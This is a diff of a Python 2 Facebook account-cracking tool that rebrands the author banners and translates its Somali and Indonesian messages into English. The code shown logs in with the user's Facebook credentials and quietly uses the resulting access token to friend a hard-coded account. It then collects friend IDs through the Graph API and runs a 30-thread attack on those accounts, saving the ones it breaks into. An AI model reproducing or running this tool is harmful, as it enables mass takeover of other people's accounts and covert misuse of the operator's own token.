@@ -54,15 +54,15 @@ logo = """
 |_| |_|_|\_\_|  \__,_|\__,_|\___(_) .__/ \__, |  /.' _/ |`'=/ " \='`| \_ `.\
                                   |_|    |___/  /` .' `\;-,'\___/',-;/` '. '\v3
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mcreat by\033[1;36m : \033[1;31mYahye Abdirahaman Dahir_\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/fikrado\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mWepSite \033[1;32m: \033[1;32msomalihacking.com\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mcreat by\033[1;36m : \033[1;31mSUKHPAL KHERERA\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/FantasticSukhi\033[0m \033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;32mTelegram \033[1;32m: \033[1;32mhttps://t.me/MAMBA_RETURNS\033[0;31m║
 \033[0;39m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[●] \x1b[1;93mBLACK MAMBA \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -76,10 +76,10 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔════════════════════════☠════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mKU SO DHAWOW\x1b[0;31m  \033[1;96m   
-\033[1;96m[¤] \x1b[0;31mWHATSAPP : +252634048063\x1b[1;96m  
-\033[1;93m[¤] \x1b[0;31mFACEBOOK : fikrado\x1b[1;96m  
-\033[1;93m[¤] \x1b[0;31mYOUTUBE  : fikrado hacker \x1b[0;31m"""
+print  """\x1b[0;31m [¤] \x1b[0;31mMAMBA\x1b[0;31m  \033[1;96m   
+\033[1;96m[¤] \x1b[0;31mWHATSAPP : +916280518579\x1b[1;96m  
+\033[1;93m[¤] \x1b[0;31mFACEBOOK : Sukhpal Kherera\x1b[1;96m  
+\033[1;93m[¤] \x1b[0;31mYOUTUBE  : @HISTORICALMANIA \x1b[0;31m"""
 print " \x1b[1;93m⚔═══════════════════════☠════════════════════════⚔"
 
 
@@ -93,14 +93,14 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;91mWAXAAD ISTICMAASHA FACEBOOK ACOUNT SI AAD U GASHID \x1b[1;96m[☆]' )
+		print('\033[1;96m[☆] \x1b[1;91mFACEBOOK ACOOUNT DETAILS U AND P \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+			print"\n\033[1;96m[!] \x1b[1;91mNo Connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -127,15 +127,15 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;91m[!] nio internet la aan ba ku haysa"
+				print"\n\x1b[1;91m[!] There is no Internet Connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;92m[!] WAA LAGA XAYIRA EE MID KALE GALI")
+			print("\n\x1b[1;92m[!] it is block so enter another one")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email WAA KHALAD")
+			print("\n\x1b[1;93mPassword/Email IT'S WRONG")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -161,7 +161,7 @@ def menu():
 		sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91mfacebook ayaa ka xayiray"
+		print"\033[1;91mfacebook Blocked it"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -175,8 +175,8 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40m══qof ka hacking"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update toolkan"																														
+	print "\033[1;32;40m[1] \033[1;33;40m══if you are knownbout hacking"	
+	print "\033[1;32;40m[2] \033[1;33;40m══Update toolkit"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -214,11 +214,11 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\x1b[1;32;40m[1] \033[1;33;40m══Asxaab tada ka hacking"
-	print "\x1b[1;32;40m[2] \033[1;33;40m══Qof kale Asxaab tiisa ka hacking"
-	print "\x1b[1;32;40m[3] \033[1;33;40m══Qof si toosa oga hacking"
-	print "\x1b[1;32;40m[4] \033[1;33;40m══QOF File ka haysid ka hacking"
-	print "\x1b[1;32;40m[0] \033[1;33;40m══DIb oga noqo"
+	print "\x1b[1;32;40m[1] \033[1;33;40m══Friends for hacking"
+	print "\x1b[1;32;40m[2] \033[1;33;40m══Hacking someone's else friends"
+	print "\x1b[1;32;40m[3] \033[1;33;40m══Someone who knows hacking directly"
+	print "\x1b[1;32;40m[4] \033[1;33;40m══QOF file keep from hacking"
+	print "\x1b[1;32;40m[0] \033[1;33;40m══Find out again"
 	pilih_super()
 
 def pilih_super():
@@ -245,10 +245,10 @@ def pilih_super():
 			op = json.loads(jok.text)
 			print"\033[1;31;40m[✺] Name : "+op["name"]
 		except KeyError:
-			print"\x1b[1;92m[✺] ID GANI MA JIRO!"
+			print"\x1b[1;92m[✺] ID IS NOT EXPOSED!"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
-		print"\033[1;35;40m[✺] WAA LA RADINAYA IDs..."
+		print"\033[1;35;40m[✺] ID's Wanted..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -265,7 +265,7 @@ def pilih_super():
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
 		except IOError:
-			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile lama helin'
+			print '\x1b[1;35;40m[!] \x1b[1;35;40mfile not found'
 			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
 			super()
 	elif peak =="0":
@@ -275,15 +275,15 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;40m[✺] inta qof ku jira : \033[1;94m"+str(len(id))
-	jalan('\033[1;34;40m[✺] Fadlan suug...')
+	print "\033[1;36;40m[✺] How many peoples are in it : \033[1;94m"+str(len(id))
+	jalan('\033[1;34;40m[✺] Please wait...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[✺] Bilaabmay\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;32;40m[✺] Started\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;31;48m●══════════════════════FIKRADO══════════════════════●"
+	print "   \033[1;31;48m●══════════════════════MAMBA══════════════════════●"
 
-	jalan('            \033[1;91mYaxye waa uu bilaaway inu qofka ka hacking gareeyo...')
+	jalan('            \033[1;91mNowstarts hacking...')
 	print  "  \033[1;36;48m ●══════════════════════HACKER══════════════════════●" 
 
 	def main(arg):
@@ -386,11 +386,11 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id) 
 	
-	print '\033[1;31;40m[✓] Yaxye hawshi waa uu dhameeyay\033[1;96m....'
+	print '\033[1;31;40m[✓] User completed this task\033[1;96m....'
 	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
 	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
 	print """
-\033[1;31;40m ●═════════════════════fikrado═══════════════════════●	           """
+\033[1;31;40m ●═════════════════════mamba═══════════════════════●	           """
 	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
 	super()
 
